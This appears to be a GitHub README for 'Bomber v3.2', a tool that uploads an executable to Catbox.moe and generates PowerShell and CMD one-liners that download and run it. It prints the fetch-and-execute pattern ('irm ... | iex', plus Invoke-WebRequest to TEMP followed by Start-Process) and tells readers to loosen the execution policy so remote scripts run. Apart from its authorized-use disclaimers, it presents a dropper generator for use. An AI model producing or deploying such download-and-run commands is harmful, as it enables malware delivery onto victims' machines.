# Bomber v3.2 - Powershell & CMD Downloader Generator

Bomber v3.2 is a professional C++ utility designed to simplify the process of creating concise downloader scripts for programmers and security researchers. The tool generates one-liner commands (PowerShell and CMD) that can download and execute files from remote servers, making deployment and distribution more efficient.

## Features

- **File Upload**: Automatically uploads selected files to Catbox.moe file hosting
- **One-Liner Generation**: Creates compact PowerShell and CMD commands for remote file execution
- **Command History**: Keeps track of all generated commands with timestamps
- **Export Functionality**: Save generated commands to a text file for later use
- **Modern UI**: Clean, professional interface with dark theme and visual effects
- **Clipboard Integration**: Easy copy functionality for generated commands

## Interface Preview

![Bomber Main Interface](https://i.ibb.co/LdFd3pkp/BOMBER-N.png)

![Bomber with Generated Code](https://i.ibb.co/KjbzzhML/BOMBER-X.png)

## Requirements

- Windows 7 or later
- Microsoft Visual C++ Redistributable
- Internet connection (for file upload functionality)

## Installation

### Option 1: Download Pre-built Binary
1. Download the latest release from the Releases section
2. Extract the ZIP file
3. Run `Bomber.exe`

### Option 2: Build from Source
1. Clone the repository:
   ```
   git clone https://github.com/ABOLHB/bomber-v3.2.git
   ```
2. Open the solution in Visual Studio 2019 or later
3. Build the project in Release mode
4. Run the compiled executable

## Usage Guide

### Step 1: Select File
1. Launch Bomber v3.2
2. Click the "Browse File..." button
3. Select the executable or script file you want to distribute
4. The selected file path will appear in the interface

### Step 2: Generate Downloader Command
1. Click the "Generate Command Downloader" button
2. The application will:
   - Upload your file to Catbox.moe
   - Create a PowerShell download script
   - Generate a one-liner command
3. Status updates will appear during the process

### Step 3: Use Generated Command
1. The generated command will appear in the history section
2. Click "Copy" next to any command to copy it to clipboard
3. Use the command in:
   - CMD terminals
   - PowerShell sessions
   - Batch scripts
   - Other deployment methods

### Additional Features

- **History Management**: All generated commands are saved in session history
- **Export History**: Click "Save as .txt" to export all generated commands to a text file
- **Direct Links**: The signature "ByABOLHB" contains embedded links (click to explore)

## Generated Command Examples

The tool creates commands in this format:
```
powershell "irm catbox.moe/[RANDOM].ps1 | iex"
```

Where the PowerShell script contains:
```
$url = 'catbox.moe/[FILENAME]'
$tempFile = Join-Path $env:TEMP '[ORIGINAL_FILENAME]'
Invoke-WebRequest -Uri $url -OutFile $tempFile
Start-Process -FilePath $tempFile - Wait
```

## Technical Details

### Dependencies
- Windows API (wininet, shell32, comdlg32, user32)
- Dear ImGui for graphical interface
- DirectX 11 for rendering

## Security Notes

⚠️ **Important**: This tool is intended for legitimate purposes only:

1. **Authorized Use Only**: Use only on systems you own or have explicit permission to access
2. **Educational Purpose**: Suitable for learning about remote deployment techniques
3. **Security Testing**: May be used in authorized penetration testing engagements
4. **Compliance**: Ensure compliance with all applicable laws and regulations

The creator (ABOLHB) assumes no responsibility for misuse of this software.

## Troubleshooting

### Common Issues

1. **Upload Fails**: Check internet connection and ensure Catbox.moe is accessible
2. **File Not Found**: Verify the selected file exists and isn't in use by another process
3. **Command Doesn't Execute**: Ensure PowerShell execution policy allows remote scripts
   ```powershell
   Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
   ```

### Error Messages
- "File does not exist!" - The selected file was moved or deleted
- "Failed to upload file" - Network issue or hosting service problem
- "Failed to create PowerShell script" - File permission or disk space issue

## Development

### Building the Project
1. Install Visual Studio 2019+ with C++ support
2. Install vcpkg or manually include:
   - Dear ImGui
   - DirectX SDK
3. Configure include directories and library paths
4. Build the solution

### Code Overview
The application uses:
- **MasonBomber class**: Handles file operations and upload logic
- **Drawing class**: Manages the ImGui interface and rendering
- **UI class**: Window creation and message processing

## License

This project is released as open-source software. See LICENSE file for details.

## Credits

**Developed by ABOLHB**

Copyright © 2024 ABOLHB. All rights reserved.

## Support

For issues, feature requests, or contributions:
1. Open an Issue on GitHub
2. Check existing documentation
3. Review the source code for implementation details

---

*Disclaimer: Use this tool responsibly and only in environments where you have explicit permission. The developer is not responsible for any misuse or damage caused by this software.*
